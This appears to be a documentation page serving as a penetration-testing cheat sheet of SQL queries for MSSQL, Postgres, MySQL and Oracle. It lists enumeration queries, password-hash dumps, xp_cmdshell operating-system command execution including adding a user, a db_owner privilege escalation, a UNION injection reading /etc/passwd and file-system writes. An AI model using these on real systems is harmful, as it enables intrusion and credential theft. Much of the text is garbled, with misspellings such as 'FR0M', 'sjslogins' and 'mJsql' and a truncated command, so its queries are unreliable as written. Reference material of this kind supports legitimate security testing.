---
title: Databases
sidebar: mydoc_sidebar
permalink: databases.html
folder: mydoc
---

# Database

Ms-sql


| **Command** | **Description** |
| :--- | :--- |
| SELECT @@version      | Database version             
| EXEC xp_msver         | version details              
| EXEC master..xp_cmdshell &apos;net user&apos;   | Run operating system command 
| SELECT HOST_NAME()               | Get Hostname and IP       
| SELECT DB_NAME()       | Current database        
| SELECT name FROM master..sysdatabases;        | List of databases            
| SELECT user name()      | Current user                
| SELECT name FROM master .. sjslogins    | List of users               
|     SELECT name FROM master..sysobjects WHERE xtype= &apos;U&apos;;    | list of tables               
|  SELECT name FROM syscolumns WHERE id=(SELECT id FR0M sysobjects WHERE name- &apos;mjtable&apos; ) ; | List of columns              




### Information about all database tables in the system table

```text
SELECT TOP 1 TABLE_NAME FROM INFORMATION SCHEMA.TABLES
```

### List of tables and columns

```text
SELECT name FROM Syscolumns WHERE id
(SELECT id FROM Sysobjects WHERE
name='mytable')
```

### Password hash

```text
SELECT name, password hash FROM master.sys.sgl_logins
```

### Bypass user access level

```text
execute('execute(''alter role [db_owner] add member [client]'') at "compatibility\poo_public"')
```

## Postgres

| **Command** | **Explanation** |
| :--- | :--- |
| SELECT version\(\); | Database version
| SELECT inet server\_addr\(\) | Get Hostname and IP
| SELECT current database\(\); | Current database |
| SELECT datname FROM pg database; | List of databases
| SELECT user; | Current user
| SELECT username FROM pg\_user; | List of users
| SELECT username,passwd FROM pg shadow | List of password hashes

### column list

```text
SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A,
pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND
(A.attrelid=C.oid) AND (A.atttjpid=T.oid) AND (A.attnum 0) AND (NOT
A.attisdropped) AND (N.nspname ILIKE 'public')
```

### List of tables

```text
SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN
pg catalog.pg namespace n ON n.oid = c.relnamespace WHERE c.relkind IN
( 'r',") AND n.nspname NOT IN ( 'pg catalog', 'pg toast') AND
pg_catalog.pg_table_is_visible(c.oid)
```

## Mysql

| **Command** | **Explanation** |
| :--- | :--- |
| SELECT @@version; | Database version
| SELECT @@hostname; | Get Hostname and IP
| SELECT database\(\); | Current database |
| SELECT distinct \(db\) FROM mysql.db; | List of databases
| SELECT user\(\); | Current user
| SELECT user FROM mysql.user; | List of users
| SELECT host,user,password FROM mJsql.user; | Password hash list

### List of all tables and columns

```text
SELECT table schema, table name, column_name FR0M
information scherna.columns WHERE
table schema != 'mysql' AND table schema != 'information schema'
```

### Execution of operating system command in mysql

```text
osql -S ip , port -U sa -P pwd -Q "exec xp cmdshell `net user /add user
passr
```

### Reading readable files in mysql

```text
UNION ALL SELECT LOAD FILE( '/etc/passwd');
```

### Writing to the file system in mysql

```text
SELECT * FROM mytable INTO dumpfile '/tmp/somefile';
```


## Oracle


| **Command** | **Explanation** |
| :--- | :--- |
| SELECT * FROM v$version; | Database version
| SELECT version FROM v$instance; | Database version
| SELECT instance name FROM v$instance; | Current database |
| SELECT name FROM v$database; | Current database
| SELECT DISTINCT owner FROM all_tables; | List of databases
| SELECT user FROM dual; | Current user
| SELECT username FROM all_users ORDER BY username; | List of users
| SELECT column name FROM all_tab_columns; | List of columns
| SELECT table name FROM all_tables; | list of tables
| SELECT name, password, astatus FROM sys.user$; | List of password hashes



### List of databases

```text
SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES';
```


{% include links.html %}
